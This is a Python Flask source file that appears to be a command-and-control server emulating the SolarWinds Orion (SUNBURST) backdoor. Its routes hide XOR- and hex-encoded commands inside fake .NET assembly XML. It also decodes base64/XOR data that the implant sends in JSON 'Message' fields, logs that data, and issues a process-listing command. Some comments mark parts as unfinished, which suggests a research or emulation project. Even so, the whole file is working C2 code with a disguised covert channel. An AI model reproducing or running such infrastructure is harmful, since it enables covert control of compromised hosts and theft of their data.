
import time
import random
import os
import binascii
import base64
from json import loads as json_loads

from datetime import datetime
from flask import Flask, render_template, request
from datetime import datetime


app = Flask(__name__)

def check_identity_client(data): # this fonction is not realistic and must be change
    if data["EventType"] == "Orion" and data["EventName"] == "EventManager":
        return True
    return False

def write_log(data = None): #must be completed
    with open("c2_log.txt", "a") as f:
        f.write(f"time : {datetime.now()}, data : {data}" +'\n \n')

def rand_byte():
    byte=''
    for _ in range(8):
        byte += str(random.randint(0,1))
    return chr(int(byte, 2))

def create_http_body(command=None):
    """
    creation of the http body in post request from the malware
    """

    if command is None:
        return """
        <assembly Name=Orion Key="7678" Version = 1.3">
        <assemblyIdentity Name="Microsoft.threading.Tasks.Extensions.Destok"/>
        <id>bin</id>
        <formats>
            <format>tar.gz</format>
            <format>tar.bz2</format>
            <format>zip</format>
        </formats>
        <fileSets>
            <fileSet>
            <directory>PubliToken=6</directory>
            <outputDirectory>/</outputDirectory>
            <includes>
                <include>*.jar</include>
            </includes>
            </fileSet>
            <fileSet>
            <directory>Name="SolarWinds.Wireless.Heatmaps.Collector</directory>
            <outputDirectory>docs</outputDirectory>
            </fileSet>
        </fileSets>
        </assembly>
        """
    else:
        size = len(str(command))
        message = size.to_bytes(4, byteorder = 'big').decode("ISO-8859-1") # need to be converted to four bytes ! (DWORD)
        message += binascii.hexlify(str(command).encode("ISO-8859-1")).decode("ISO-8859-1")
        random_byte = "".join([rand_byte() for k in range(23-len(message))])
        message += binascii.hexlify(random_byte.encode("ISO-8859-1")).decode("ISO-8859-1")
        first_byte_message = ord("a")
        print("message : ", message.encode("ISO-8859-1"))
        xored = "".join([chr(ord(cs) ^ first_byte_message) for cs in message]).encode("ISO-8859-1")
        final_message = binascii.hexlify(xored).decode("ISO-8859-1")
        print("final xored message : ", final_message, len(final_message))

        part_1 = final_message[:32]
        part_2 = final_message[32:64]
        part_3 = final_message[64:]

        return f"""
        <assembly Name=Orion Key="7678" Version = 1.3">
        <assemblyIdentity Name="Microsoft.threading.Tasks.Extensions.Destok"/>
        <id>bin</id>
        <formats>
            <format>tar.gz</format>
            <format>tar.bz2</format>
            <format>zip</format>
        </formats>
        <fileSets>
            <fileSet>
            <directory>PubliToken=6 Key="{part_1[:8]}-{part_1[8:12]}-{part_1[12:16]}-{part_1[16:20]}-{part_1[20:]}"</directory>
            <outputDirectory>/</outputDirectory>
            <includes>
                <include>PublicToken={part_2}</include>
            </includes>
            </fileSet>
            <fileSet>
            <directory>Name="SolarWinds.Wireless.Heatmaps.Collector</directory>
            <outputDirectory>Hash={part_3}</outputDirectory>
            </fileSet>
        </fileSets>
        </assembly>
        """

def get_data_from_malware(json):
    """
    Data are in the in the 'Message' fields
    """
    list_message_received = []
    for k in range(len(json["steps"])):
        try:
            list_message_received.append(base64.urlsafe_b64decode(json["steps"][k]["Message"]).decode("ISO-8859-1"))
        except:
            pass

    string_received = "".join(list_message_received)

    xor_byte = ord("a")

    xor_received = "".join([chr(ord(cs) ^ xor_byte) for cs in string_received])

    answer_malware_string = binascii.unhexlify(xor_received.encode("ISO-8859-1")).decode("ISO-8859-1")

    #json_data_received = json_loads(answer_malware_string)

    date = str(datetime.now())
    write_log(answer_malware_string)

    return 1

@app.route("/")
def home():
    #write_log()
    return create_http_body()

@app.route("/", methods=['POST'])
def send_instruction():

    content_type = request.headers.get('Content-Type')

    if (content_type == 'application/json'):
        json_received = request.get_json()
        #print("json_received : ", json_received)
        #if check_identity_client(json_received): # C2 know it communicates with the malware
        if json_received["steps"] != []:
            get_data_from_malware(json_received)

        body = create_http_body(6) # GetProcessByDescription #Returns a process listing. If no arguments are provided returns just the PID and process name
        return body

    return create_http_body()


if __name__ == "__main__":
    app.run(debug=True)